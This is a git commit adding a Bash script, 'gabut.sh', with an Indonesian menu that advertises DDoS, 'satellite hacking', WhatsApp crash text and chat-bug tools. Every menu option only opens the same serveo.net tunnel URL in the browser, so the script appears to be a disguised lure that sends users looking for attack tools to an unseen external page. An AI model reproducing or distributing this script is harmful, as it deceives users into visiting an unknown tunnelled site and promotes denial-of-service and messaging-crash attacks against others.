fb29715e029ac7b37494d4833304d529907cf47b
CY78 <osintcy278@gmail.com>
2024-06-20 08:05:39 +0700

    Create gabut.sh

---
+++ gabut.sh
@@ -0,0 +1,48 @@
+#!/bin/bash
+#GABUT
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo "TOOLS GABUTAN "
+echo "[1].DDOS SERVER "
+echo "[2].HACK SATELIT"
+echo "[3].VIRTEX KEBAL "
+echo "[4].BUG CHAT WA "
+echo "[5].brechead from mod "
+
+echo "\033[33;1m"
+read -p "  SILAKAN PILIH YA SESUAI NOMOR  " c;
+
+if [ $c = 1 ]
+then
+clear
+xdg-open  "https://4c3256261e88f02ab243f733481c2fcf.serveo.net"
+fi
+
+
+if [ $c = 2 ]
+then 
+xdg-open  "https://4c3256261e88f02ab243f733481c2fcf.serveo.net"
+
+fi
+if [ $c = 3 ]
+then 
+xdg-open  "https://4c3256261e88f02ab243f733481c2fcf.serveo.net"
+
+fi
+if [ $c = 4 ]
+then 
+xdg-open  "https://4c3256261e88f02ab243f733481c2fcf.serveo.net"
+
+fi
+if [ $c = 5 ]
+then 
+xdg-open  "https://4c3256261e88f02ab243f733481c2fcf.serveo.net"
+
+fi
